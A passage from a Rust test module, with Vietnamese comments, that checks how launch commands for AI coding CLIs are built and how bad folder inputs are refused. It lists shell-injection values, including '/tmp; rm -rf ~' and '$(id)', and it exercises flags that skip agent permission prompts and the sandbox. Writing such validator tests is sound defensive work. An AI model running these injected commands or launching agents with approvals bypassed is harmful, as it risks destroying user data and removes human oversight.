        assert!(cmd.ends_with("pause\r\n(goto) 2>nul & del \"%~f0\"\r\n"));

        let codex = cli_launch(&plans(), "codex-2", Some("  "), None, false).unwrap();
        assert_eq!(codex.argv, ["codex"]);
        assert_eq!(codex.env, Some(("CODEX_HOME", "/opt/codex 2".into())));
        assert_eq!(codex.cwd, None, "thư mục trống là không đặt");

        // Antigravity chạy bằng `agy` và không có biến thư mục đăng nhập.
        let agy = cli_launch(&plans(), "antigravity-1", None, None, false).unwrap();
        assert_eq!((agy.argv, agy.env), (vec!["agy".to_string()], None));

        // Bỏ hỏi quyền: cờ cố định theo CLI, đặt ngay sau binary.
        let claude = cli_launch(&plans(), "claude-1", None, None, true).unwrap();
        assert_eq!(claude.argv, ["claude", "--dangerously-skip-permissions"]);
        let codex = cli_launch(&plans(), "codex-2", None, None, true).unwrap();
        assert_eq!(
            codex.argv,
            ["codex", "--dangerously-bypass-approvals-and-sandbox"]
        );
        let agy = cli_launch(&plans(), "antigravity-1", None, None, true).unwrap();
        assert_eq!(agy.argv, ["agy", "--dangerously-skip-permissions"]);

        // `~` cần biết thư mục nhà; thư mục nhà thật thì có và là thư mục.
        assert!(cli_launch(&plans(), "claude-1", Some("~"), None, false).is_err());
        let real = std::env::temp_dir();
        let home = real.parent().unwrap_or(&real);
        let job = cli_launch(&plans(), "claude-1", Some("~"), Some(home), false).unwrap();
        assert_eq!(job.cwd.as_deref(), Some(home.to_string_lossy().as_ref()));
    }

    #[test]
    fn open_cli_refuses_unknown_input() {
        let folder = env!("CARGO_MANIFEST_DIR");
        let refuse = |id: &str, folder: Option<&str>| {
            cli_launch(&plans(), id, folder, None, false).expect_err(id)
        };
        assert!(refuse("nope-1", None).contains("Không có gói"));
        assert!(refuse("", None).contains("Không có gói"));
        assert!(refuse("gemini-1", None).contains("Chưa mở được CLI gemini"));
        assert!(
            refuse("claude-9", None).contains("không hợp lệ"),
            "thư mục đăng nhập lạ"
        );
        assert!(
            refuse("claude-1", Some("/không/có/thư/mục/này")).contains("không có"),
            "thư mục không tồn tại"
        );
        let file = format!("{folder}/Cargo.toml");
        assert!(refuse("claude-1", Some(&file)).contains("không phải thư mục"));
        for bad in [
            "/tmp; rm -rf ~",
            "/tmp && id",
            "/tmp/$(id)",
            "/tmp/`id`",
            "/tmp/a'b",
            "/tmp/a\"b",
            "/tmp/a|b",
            "/tmp/a\nb",
            "%USERPROFILE%",
        ] {
            assert!(
                refuse("claude-1", Some(bad)).contains("không hợp lệ"),
                "{bad}"
            );
        }
    }

    #[test]
    fn home_expands_only_leading_tilde() {
        let home = Some(Path::new("/home/duy"));
        assert_eq!(
            expand_home("~/.codex-2", home).unwrap(),
            "/home/duy/.codex-2"
        );
        assert_eq!(expand_home("~", home).unwrap(), "/home/duy");
        assert_eq!(expand_home("/opt/~x", home).unwrap(), "/opt/~x");
        assert_eq!(expand_home("~other/x", home).unwrap(), "~other/x");
    }
}
